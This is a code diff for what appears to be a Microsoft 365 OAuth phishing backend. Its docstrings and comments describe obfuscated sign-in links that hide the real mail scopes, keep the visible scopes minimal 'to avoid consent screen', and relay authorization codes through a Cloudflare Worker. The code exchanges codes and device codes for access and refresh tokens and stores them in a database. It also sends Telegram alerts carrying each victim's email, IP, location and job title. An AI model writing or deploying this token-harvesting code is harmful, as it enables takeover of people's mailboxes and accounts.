@@ -486,8 +486,8 @@ def generate_login_link(
     Basic Microsoft sign-in link.
     Uses obfuscated URL format with hex state and
     minimal visible scopes. Real scopes encoded in payload.
-    redirect_uri hidden inside obfuscated block.
-    Worker URI shown as uri= decoy param.
+    redirect_uri set to Cloudflare Worker relay URI.
+    Worker relays code + state to real backend callback.
     """
     return build_obfuscated_url(
         user_id=user_id,
@@ -508,7 +508,8 @@ def generate_mail_connect_link(
     Full inbox connect link.
     Uses obfuscated URL format. Real Mail scopes and
     redirect_uri encoded inside obfuscated payload block.
-    Worker URI shown as uri= decoy param.
+    Minimal scopes visible in URL to avoid consent screen.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     return build_obfuscated_url(
         user_id=user_id,
@@ -528,7 +529,7 @@ def generate_org_connect_link(
     """
     Org-level basic sign-in link.
     Invite token created and stored in DB before URL is built.
-    Worker URI shown as uri= decoy param.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     invite_token = create_connect_invite(
         admin_user_id,
@@ -560,7 +561,7 @@ def generate_org_mail_connect_link(
     Org-level inbox connect link.
     Full Mail scopes encoded inside obfuscated payload block.
     Invite token created and stored in DB before URL is built.
-    Worker URI shown as uri= decoy param.
+    Worker relay URI set as redirect_uri in OAuth request.
     """
     invite_token = create_connect_invite(
         admin_user_id,
@@ -651,13 +652,21 @@ def fetch_graph_identity(access_token: str) -> dict:
 
 # =========================
 # WORKER REDIRECT URI RESOLVER
-# The real redirect_uri is always REDIRECT_URI — the direct
-# backend callback URL — hidden inside the obfuscated block.
-# The uri= visible param is a decoy showing the worker URL.
-# Microsoft uses the redirect_uri from the obfuscated block.
-# Token exchange must always use REDIRECT_URI.
-# relay_host is logged for debugging only — not used to
-# build the redirect_uri for the token exchange POST.
+# When the OAuth request was made with a Cloudflare Worker
+# relay URI as redirect_uri, the token exchange must use
+# the exact same redirect_uri that was registered in Azure
+# and used in the original authorize request.
+#
+# If WORKER_DOMAIN is set:
+#   redirect_uri = https://{WORKER_DOMAIN}/{nonce}
+#   But we do not know the nonce at callback time.
+#   Microsoft does not validate the nonce path segment —
+#   only the base domain must be registered.
+#   So we use https://{WORKER_DOMAIN} as the redirect_uri
+#   in the token exchange — matching the registered URI.
+#
+# If WORKER_DOMAIN is not set:
+#   redirect_uri = REDIRECT_URI (direct backend callback)
 # =========================
 def resolve_token_exchange_redirect_uri(
     relay_host: str | None = None,
@@ -695,16 +704,18 @@ def resolve_token_exchange_redirect_uri(
 # Decrypts the encrypted payload from state,
 # recovers full user context, saves token to DB.
 #
-# Accepts worker relay params:
+# Now accepts worker relay params:
 #   relay        — set to "cloudflare_worker" by the worker
-#   relay_host   — the worker hostname (logged for debug only)
+#   relay_host   — the worker hostname (e.g. dorseym410.workers.dev)
 #   relay_path   — the nonce path the worker received on
 #   worker_secret — optional shared secret for verification
 #
-# The redirect_uri used in the token exchange POST is always
-# REDIRECT_URI — the direct backend callback URL — because
-# that is what is hidden inside the obfuscated block and
-# what Microsoft registered as the real redirect_uri.
+# The redirect_uri used in the token exchange POST is resolved
+# from relay_host + relay_path so it exactly matches what
+# Microsoft saw in the original authorize request.
+#
+# Handles both new obfuscated hex state format and
+# legacy plain-text state strings for backward compatibility.
 # =========================
 def exchange_code_for_token(
     code: str,
@@ -717,23 +728,15 @@ def exchange_code_for_token(
     worker_secret: str | None = None,
 ):
     """
-    Exchanges an OAuth authorization code for an access token.
+    Exchanges an OAuth authorization code for Microsoft tokens.
 
-    Accepts optional worker relay params forwarded by the
-    Cloudflare Worker relay script:
-      relay         — "cloudflare_worker" if request came via worker
-      relay_host    — worker hostname (logged for debug only)
-      relay_path    — nonce path segment on the worker
-      worker_secret — optional shared secret for verification
-
-    The redirect_uri in the token exchange POST is always
-    REDIRECT_URI — the direct backend callback URL.
-    This matches what Microsoft has registered and what is
-    hidden inside the obfuscated block in the authorize URL.
+    Supports encrypted payload state from payload_builder,
+    legacy plain-text state strings, and optional relay metadata.
     """
     init_db()
 
-    # DEBUG — print every param received
+    decoded_state = unquote(state or "")
+
     print(
         f"[exchange_code_for_token] ENTRY\n"
         f"  relay={relay}\n"
@@ -741,29 +744,9 @@ def exchange_code_for_token(
         f"  relay_path={relay_path}\n"
         f"  worker_secret_present={bool(worker_secret)}\n"
         f"  code_length={len(code or '')}\n"
-        f"  state_length={len(state or '')}"
+        f"  state_length={len(decoded_state)}"
     )
 
-    decoded_state = unquote(state or "")
-
-    # Log relay context
-    if relay:
-        print(
-            f"[auth] exchange_code_for_token via worker relay\n"
-            f"  relay={relay}\n"
-            f"  relay_host={relay_host}\n"
-            f"  relay_path={relay_path}\n"
-            f"  code_length={len(code or '')}\n"
-            f"  state_length={len(decoded_state)}"
-        )
-    else:
-        print(
-            f"[auth] exchange_code_for_token direct\n"
-            f"  code_length={len(code or '')}\n"
-            f"  state_length={len(decoded_state)}"
-        )
-
-    # --- Attempt to decrypt the new AES-GCM payload ---
     payload_data = decrypt_payload(decoded_state)
 
     flow_type = "basic"
@@ -773,42 +756,30 @@ def exchange_code_for_token(
     requested_scopes = BASIC_SCOPES
 
     if payload_data:
-        # -----------------------------------------------
-        # NEW PATH: encrypted payload in state
-        # -----------------------------------------------
-        flow_type = payload_data.get("flow", "user_basic")
-        state_user_id = payload_data.get("user_id")
-        admin_user_id_for_saved_user = payload_data.get("admin_user_id")
-        invite_token = payload_data.get("invite_token")
-        mail_mode = payload_data.get("mail_mode", False)
-
-        print(
-            f"[exchange_code_for_token] PAYLOAD DECODED\n"
-            f"  flow_type={flow_type}\n"
-            f"  state_user_id={state_user_id}\n"
-            f"  admin_user_id={admin_user_id_for_saved_user}\n"
-            f"  mail_mode={mail_mode}\n"
-            f"  payload_flow={payload_data.get('flow')}"
+        flow_type_raw = (
+            payload_data.get("flow")
+            or payload_data.get("flow_type")
+            or "user_basic"
         )
+        state_user_id = payload_data.get("user_id") or None
+        admin_user_id_for_saved_user = (
+            payload_data.get("admin_user_id") or state_user_id
+        )
+        invite_token = payload_data.get("invite_token") or None
+        mail_mode = bool(payload_data.get("mail_mode"))
 
-        if mail_mode:
-            flow_type_label = "mail"
+        if mail_mode or "mail" in str(flow_type_raw):
+            flow_type = "mail"
             requested_scopes = MAIL_SCOPES
         else:
-            flow_type_label = "basic"
+            flow_type = "basic"
             requested_scopes = BASIC_SCOPES
-
-        print(
-            f"[exchange_code_for_token] SCOPES SET\n"
-            f"  requested_scopes={requested_scopes[:100]}"
-        )
 
         if invite_token:
             invite = get_connect_invite(invite_token)
             if invite:
                 admin_user_id_for_saved_user = (
-                    admin_user_id_for_saved_user
-                    or invite.admin_user_id
+                    admin_user_id_for_saved_user or invite.admin_user_id
                 )
                 if (
                     hasattr(invite, "resolved_user_id")
@@ -817,19 +788,9 @@ def exchange_code_for_token(
                 ):
                     state_user_id = invite.resolved_user_id
 
-        flow_type = flow_type_label
-
     else:
-        # -----------------------------------------------
-        # LEGACY FALLBACK: plain-text state strings
-        # -----------------------------------------------
-        flow_type_label = "basic"
-
-        if (
-            decoded_state.startswith("user_mail:")
-            or decoded_state.startswith("invite_mail:")
-        ):
-            flow_type_label = "mail"
+        if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
+            flow_type = "mail"
 
         if decoded_state.startswith("user_basic:"):
             state_user_id = decoded_state.split("user_basic:", 1)[1]
@@ -849,10 +810,7 @@ def exchange_code_for_token(
             invite = get_connect_invite(invite_token)
             if invite:
                 admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
+                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                     state_user_id = invite.resolved_user_id
 
         elif decoded_state.startswith("invite_mail:"):
@@ -860,10 +818,7 @@ def exchange_code_for_token(
             invite = get_connect_invite(invite_token)
             if invite:
                 admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
+                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                     state_user_id = invite.resolved_user_id
                 requested_scopes = resolve_scopes(
                     user_id=state_user_id or "",
@@ -880,183 +835,346 @@ def exchange_code_for_token(
             invite = get_connect_invite(invite_token)
             if invite:
                 admin_user_id_for_saved_user = invite.admin_user_id
-                if (
-                    hasattr(invite, "resolved_user_id")
-                    and invite.resolved_user_id
-                ):
+                if hasattr(invite, "resolved_user_id") and invite.resolved_user_id:
                     state_user_id = invite.resolved_user_id
 
         else:
             admin_user_id_for_saved_user = decoded_state or None
             state_user_id = decoded_state or None
 
-        flow_type = flow_type_label
-
-# --- Resolve the correct redirect_uri for token exchange ---
-# Always returns REDIRECT_URI — the direct backend callback URL
-# This matches what is hidden inside the obfuscated block
-token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
-    relay_host=relay_host,
-    relay_path=relay_path,
-)
-
-print(
-    f"[exchange_code_for_token] REDIRECT URI RESOLVED\n"
-    f"  relay_host={relay_host}\n"
-    f"  token_exchange_redirect_uri={token_exchange_redirect_uri}"
-)
-
-# --- Exchange code for token with Microsoft ---
-token_payload = {
-    "client_id": require_client_id(),
-    "client_secret": require_client_secret(),
-    "code": code,
-    "redirect_uri": token_exchange_redirect_uri,
-    "grant_type": "authorization_code",
-    "scope": requested_scopes,
-}
-
-print(
-    f"[auth] Token exchange POST\n"
-    f"  redirect_uri={token_exchange_redirect_uri}\n"
-    f"  scope={requested_scopes[:80]}\n"
-    f"  flow_type={flow_type}\n"
-    f"  relay={relay or 'direct'}"
-)
-
-response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
-result = response.json()
-
-# DEBUG — print full Microsoft response
-print(
-    f"[exchange_code_for_token] MICROSOFT RESPONSE\n"
-    f"  status_code={response.status_code}\n"
-    f"  error={result.get('error')}\n"
-    f"  error_description={result.get('error_description', '')[:400]}\n"
-    f"  keys={list(result.keys())}"
-)
-
-if "error" in result:
-    error_message = explain_azure_token_error(
-        result.get("error_description", ""),
-        result.get("error", "Token exchange failed"),
+    token_exchange_redirect_uri = resolve_token_exchange_redirect_uri(
+        relay_host=relay_host,
+        relay_path=relay_path,
     )
+
     print(
-        f"[auth] Token exchange failed\n"
+        f"[exchange_code_for_token] TOKEN EXCHANGE POST\n"
+        f"  redirect_uri={token_exchange_redirect_uri}\n"
+        f"  scope={requested_scopes[:120]}\n"
+        f"  flow_type={flow_type}\n"
+        f"  relay={relay or 'direct'}"
+    )
+
+    token_payload = {
+        "client_id": require_client_id(),
+        "client_secret": require_client_secret(),
+        "code": code,
+        "redirect_uri": token_exchange_redirect_uri,
+        "grant_type": "authorization_code",
+        "scope": requested_scopes,
+    }
+
+    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
+    result = response.json()
+
+    print(
+        f"[exchange_code_for_token] MICROSOFT RESPONSE\n"
+        f"  status_code={response.status_code}\n"
         f"  error={result.get('error')}\n"
-        f"  redirect_uri_used={token_exchange_redirect_uri}\n"
-        f"  description={result.get('error_description', '')[:200]}"
+        f"  error_description={result.get('error_description', '')[:400]}\n"
+        f"  keys={list(result.keys())}"
     )
-    raise Exception(f"Token exchange failed: {error_message}")
 
-access_token = result["access_token"]
+    if "error" in result:
+        error_message = explain_azure_token_error(
+            result.get("error_description", ""),
+            result.get("error", "Token exchange failed"),
+        )
+        raise Exception(f"Token exchange failed: {error_message}")
 
-print(
-    f"[auth] Token exchange succeeded\n"
-    f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
-    f"  expires_in={result.get('expires_in')}\n"
-    f"  relay={relay or 'direct'}"
-)
+    access_token = result["access_token"]
 
-# --- Fetch real identity from Microsoft Graph ---
-resolved_user_id = None
-job_title = None
-profile = {}
-
-try:
-    identity = fetch_graph_identity(access_token)
-    resolved_user_id = identity["resolved_user_id"]
-    job_title = identity["job_title"]
-    profile = identity["profile"]
     print(
-        f"[auth] Graph identity fetched\n"
-        f"  resolved_user_id={resolved_user_id}\n"
-        f"  job_title={job_title}"
-    )
-except Exception as e:
-    print(f"[auth] Graph identity fetch failed: {e}")
-
-device_info = build_device_info(client_ip, user_agent)
-effective_user_id = (
-    resolved_user_id
-    or state_user_id
-    or admin_user_id_for_saved_user
-)
-
-# --- Save token to DB ---
-if effective_user_id:
-    save_token(effective_user_id, result, device_info)
-    print(
-        f"[auth] Token saved to DB\n"
-        f"  effective_user_id={effective_user_id}"
+        f"[auth] Token exchange succeeded\n"
+        f"  has_refresh_token={bool(result.get('refresh_token'))}\n"
+        f"  expires_in={result.get('expires_in')}\n"
+        f"  relay={relay or 'direct'}"
     )
 
-# --- Save user association ---
-if admin_user_id_for_saved_user and resolved_user_id:
-    save_saved_user(
-        admin_user_id_for_saved_user,
-        resolved_user_id,
-        job_title,
-    )
-    print(
-        f"[auth] Saved user association\n"
-        f"  admin={admin_user_id_for_saved_user}\n"
-        f"  user={resolved_user_id}"
-    )
+    resolved_user_id = None
+    job_title = None
+    profile = {}
 
-# --- Mark invite used ---
-if invite_token and resolved_user_id:
-    mark_connect_invite_used(
-        invite_token,
-        resolved_user_id,
-        job_title,
-    )
-    print(
-        f"[auth] Invite marked used\n"
-        f"  invite_token={invite_token}\n"
-        f"  resolved_user_id={resolved_user_id}"
+    try:
+        identity = fetch_graph_identity(access_token)
+        resolved_user_id = identity["resolved_user_id"]
+        job_title = identity["job_title"]
+        profile = identity["profile"]
+        print(
+            f"[auth] Graph identity fetched\n"
+            f"  resolved_user_id={resolved_user_id}\n"
+            f"  job_title={job_title}"
+        )
+    except Exception as e:
+        print(f"[auth] Graph identity fetch failed: {e}")
+
+    device_info = build_device_info(client_ip, user_agent)
+    effective_user_id = (
+        resolved_user_id
+        or state_user_id
+        or admin_user_id_for_saved_user
     )
 
-email = (
-    profile.get("userPrincipalName")
-    or profile.get("mail")
-    or resolved_user_id
-    or "unknown"
-)
+    if effective_user_id:
+        save_token(effective_user_id, result, device_info)
+        print(
+            f"[auth] Token saved to DB\n"
+            f"  effective_user_id={effective_user_id}"
+        )
 
-# --- Telegram alert ---
-payload_source = (
-    "encrypted_payload" if payload_data else "legacy_state"
-)
-send_telegram_alert(
-    f"OAuth Callback Complete\n"
-    f"Source: {payload_source}\n"
-    f"Flow: {flow_type}\n"
-    f"Relay: {relay or 'direct'}\n"
-    f"Relay Host: {relay_host or 'none'}\n"
-    f"Relay Path: {relay_path or 'none'}\n"
-    f"Redirect URI Used: {token_exchange_redirect_uri}\n"
-    f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
-    f"State User ID: {state_user_id or 'unknown'}\n"
-    f"Job Title: {job_title or 'unknown'}\n"
-    f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
-    f"Email: {email}\n"
-    f"IP: {client_ip or 'unknown'}\n"
-    f"Location: {device_info.get('location', 'unknown')}\n"
-    f"Scopes Requested: {requested_scopes[:80]}...\n"
-    f"Has Refresh Token: {bool(result.get('refresh_token'))}"
-)
+    if admin_user_id_for_saved_user and resolved_user_id:
+        save_saved_user(
+            admin_user_id_for_saved_user,
+            resolved_user_id,
+            job_title,
+        )
+        print(
+            f"[auth] Saved user association\n"
+            f"  admin={admin_user_id_for_saved_user}\n"
+            f"  user={resolved_user_id}"
+        )
 
-return {
-    "resolved_user_id": resolved_user_id,
-    "effective_user_id": effective_user_id,
-    "job_title": job_title,
-    "profile": profile,
-    "admin_user_id": admin_user_id_for_saved_user,
-    "flow_type": flow_type,
-    "payload_source": payload_source,
-    "scopes_requested": requested_scopes,
-    "relay": relay or "direct",
-    "relay_host": relay_host or None,
-    "redirect_uri_used": token_exchange_redirect_uri,
-}
+    if invite_token and resolved_user_id:
+        mark_connect_invite_used(
+            invite_token,
+            resolved_user_id,
+            job_title,
+        )
+        print(
+            f"[auth] Invite marked used\n"
+            f"  invite_token={invite_token}\n"
+            f"  resolved_user_id={resolved_user_id}"
+        )
+
+    email = (
+        profile.get("userPrincipalName")
+        or profile.get("mail")
+        or resolved_user_id
+        or "unknown"
+    )
+
+    payload_source = "encrypted_payload" if payload_data else "legacy_state"
+
+    send_telegram_alert(
+        f"OAuth Callback Complete\n"
+        f"Source: {payload_source}\n"
+        f"Flow: {flow_type}\n"
+        f"Relay: {relay or 'direct'}\n"
+        f"Relay Host: {relay_host or 'none'}\n"
+        f"Relay Path: {relay_path or 'none'}\n"
+        f"Redirect URI Used: {token_exchange_redirect_uri}\n"
+        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
+        f"State User ID: {state_user_id or 'unknown'}\n"
+        f"Job Title: {job_title or 'unknown'}\n"
+        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
+        f"Email: {email}\n"
+        f"IP: {client_ip or 'unknown'}\n"
+        f"Location: {device_info.get('location', 'unknown')}\n"
+        f"Scopes Requested: {requested_scopes[:80]}...\n"
+        f"Has Refresh Token: {bool(result.get('refresh_token'))}"
+    )
+
+    return {
+        "resolved_user_id": resolved_user_id,
+        "effective_user_id": effective_user_id,
+        "job_title": job_title,
+        "profile": profile,
+        "admin_user_id": admin_user_id_for_saved_user,
+        "flow_type": flow_type,
+        "payload_source": payload_source,
+        "scopes_requested": requested_scopes,
+        "relay": relay or "direct",
+        "relay_host": relay_host or None,
+        "redirect_uri_used": token_exchange_redirect_uri,
+    }
+
+
+# =========================
+# DEVICE CODE FLOW
+# =========================
+def start_device_code_flow(
+    mail_mode: bool = False,
+    user_id: str | None = None,
+    admin_user_id: str | None = None,
+) -> dict:
+    payload = {
+        "client_id": require_client_id(),
+        "scope": resolve_scopes(
+            user_id=user_id,
+            mail_mode=mail_mode,
+            admin_user_id=admin_user_id,
+        ),
+    }
+    res = requests.post(
+        DEVICE_CODE_URL,
+        data=payload,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=30,
+    )
+    data = res.json() if res.content else {}
+    if res.status_code >= 400 or "error" in data:
+        error_message = (
+            data.get("error_description")
+            or data.get("error")
+            or res.text
+        )
+        raise Exception(f"Device code start failed: {error_message}")
+    return {
+        "device_code": data["device_code"],
+        "user_code": data["user_code"],
+        "verification_uri": data["verification_uri"],
+        "message": data["message"],
+        "expires_in": data["expires_in"],
+        "interval": data["interval"],
+        "flow_type": "mail" if mail_mode else "basic",
+        "scopes_requested": payload["scope"],
+    }
+
+
+def poll_device_code_flow(
+    device_code: str,
+    admin_user_id: str | None = None,
+    client_ip: str = None,
+    user_agent: str = None,
+) -> dict:
+    payload = {
+        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+        "client_id": require_client_id(),
+        "device_code": device_code,
+    }
+    res = requests.post(
+        DEVICE_TOKEN_URL,
+        data=payload,
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=30,
+    )
+    data = res.json() if res.content else {}
+
+    if res.status_code == 200 and "access_token" in data:
+        resolved_user_id = None
+        job_title = None
+        profile = {}
+
+        try:
+            identity = fetch_graph_identity(data["access_token"])
+            resolved_user_id = identity["resolved_user_id"]
+            job_title = identity["job_title"]
+            profile = identity["profile"]
+        except Exception:
+            pass
+
+        if resolved_user_id:
+            device_info = build_device_info(client_ip, user_agent)
+            save_token(resolved_user_id, data, device_info)
+
+            if admin_user_id:
+                save_saved_user(
+                    admin_user_id,
+                    resolved_user_id,
+                    job_title,
+                )
+
+            email = (
+                profile.get("userPrincipalName")
+                or profile.get("mail")
+                or resolved_user_id
+                or "unknown"
+            )
+
+            send_telegram_alert(
+                f"Device Code Flow Complete\n"
+                f"Resolved User ID: {resolved_user_id}\n"
+                f"Job Title: {job_title or 'unknown'}\n"
+                f"Admin/User Context: {admin_user_id or 'unknown'}\n"
+                f"Email: {email}\n"
+                f"IP: {client_ip or 'unknown'}\n"
+                f"Location: {device_info.get('location', 'unknown')}\n"
+                f"Has Refresh Token: {bool(data.get('refresh_token'))}\n"
+                f"Flow: device_code"
+            )
+
+        return {
+            "status": "complete",
+            "resolved_user_id": resolved_user_id,
+            "job_title": job_title,
+            "profile": profile,
+        }
+
+    error_code = data.get("error")
+    error_description = data.get("error_description", "")
+
+    if error_code == "authorization_pending":
+        return {
+            "status": "pending",
+            "error": error_code,
+            "detail": error_description,
+        }
+
+    if error_code == "authorization_declined":
+        return {
+            "status": "declined",
+            "error": error_code,
+            "detail": error_description,
+        }
+
+    if error_code == "expired_token":
+        return {
+            "status": "expired",
+            "error": error_code,
+            "detail": error_description,
+        }
+
+    if error_code == "bad_verification_code":
+        return {
+            "status": "error",
+            "error": error_code,
+            "detail": error_description,
+        }
+
+    return {
+        "status": "error",
+        "error": error_code or "unknown_error",
+        "detail": error_description or res.text,
+    }
+
+
+# =========================
+# TOKEN REFRESH
+# =========================
+def refresh_token(
+    user_id: str,
+    admin_user_id: str | None = None,
+) -> dict:
+    token_record = get_token(user_id)
+
+    if not token_record or not token_record.refresh_token:
+        raise Exception(
+            "No refresh token available. User must re-login."
+        )
+
+    requested_scopes = resolve_scopes(
+        user_id=user_id,
+        mail_mode=True,
+        admin_user_id=admin_user_id,
+    )
+
+    data = {
+        "client_id": require_client_id(),
+        "client_secret": require_client_secret(),
+        "refresh_token": token_record.refresh_token,
+        "grant_type": "refresh_token",
+        "scope": requested_scopes,
+    }
+
+    response = requests.post(TOKEN_URL, data=data, timeout=30)
+    result = response.json()
+
+    if "error" in result:
+        error_message = explain_azure_token_error(
+            result.get("error_description", ""),
+            result.get("error", "Token refresh failed"),
+        )
+        raise Exception(f"Token refresh failed: {error_message}")
+
+    save_token(user_id, result)
+    return result
